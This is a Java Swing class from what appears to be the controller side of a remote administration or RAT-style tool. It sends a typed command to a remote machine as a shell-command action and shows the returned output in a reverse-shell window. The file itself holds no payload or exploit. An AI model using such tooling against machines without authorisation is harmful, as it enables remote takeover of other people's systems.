package GUI.TableUtils.ReverseShell;

import Information.Action;

import javax.swing.*;
import javax.swing.text.DefaultCaret;
import java.io.IOException;
import java.util.Arrays;

public class CommandSender extends SwingWorker<Void, Void> {
    private final ReverseShellGUI reverseShellGUI;
    String command;

    public CommandSender(ReverseShellGUI reverseShellGUI) {
        this.reverseShellGUI = reverseShellGUI;
        command = reverseShellGUI.getFieldOfCommands().getText();

    }

    String userConsolePosition = "";
    String resultOfCommand = "";

    @Override
    protected Void doInBackground() throws IOException {
        resultOfCommand = reverseShellGUI.getStream().sendAndReadJSONX(Action.SHELL_COMMAND, command);
        String[] arrayOfInformation = resultOfCommand.split("\\|");
        System.out.println(arrayOfInformation.length);
        userConsolePosition = arrayOfInformation[0];
        if (resultOfCommand.length() > 1) resultOfCommand = arrayOfInformation[1];
        return null;
    }

    @Override
    protected void done() {
        System.out.println(resultOfCommand.length());
        String totalResult = userConsolePosition + ">" + command + "\n";
        if (!resultOfCommand.equals("")) totalResult += resultOfCommand + "\n";
        reverseShellGUI.getTextAreaOfResult().append(totalResult);
    }
}
